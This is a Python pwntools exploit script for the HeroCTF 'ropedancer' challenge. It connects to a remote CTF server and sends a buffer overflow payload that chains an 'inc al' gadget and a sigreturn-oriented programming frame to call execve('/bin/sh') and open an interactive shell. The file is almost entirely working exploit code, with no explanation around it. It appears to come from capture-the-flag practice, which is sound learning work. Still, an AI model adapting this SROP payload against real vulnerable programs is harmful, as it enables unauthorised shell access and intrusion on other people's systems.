#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("ropedancer")

local = False 
if local:
    p = process("./ropedancer")
    gdb.attach(p,'''b*_get_motivation_letter_end+3\nc''')
else:
    p = remote('static-03.heroctf.fr', 5002)

elf = context.binary = ELF('./ropedancer', checksec=False)

p.sendlineafter(b"dancer?",b"yes")

start = 0x0000000000401016
inc_al = 0x0000000000401013
mail = cyclic(0x10) +  p64(0x40312c) + p64(0x0000000000401115) + p64(0x40312c)
p.sendline(mail)
BINSH = 0x40312c

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = 0x000000000040102f

payload = b"/bin/sh\x00" + p64(0x0000000000401011) + p64(inc_al)*14  +p64(0x000000000040102f)
payload += bytes(frame)
p.sendlineafter(b" you:", payload)
p.interactive()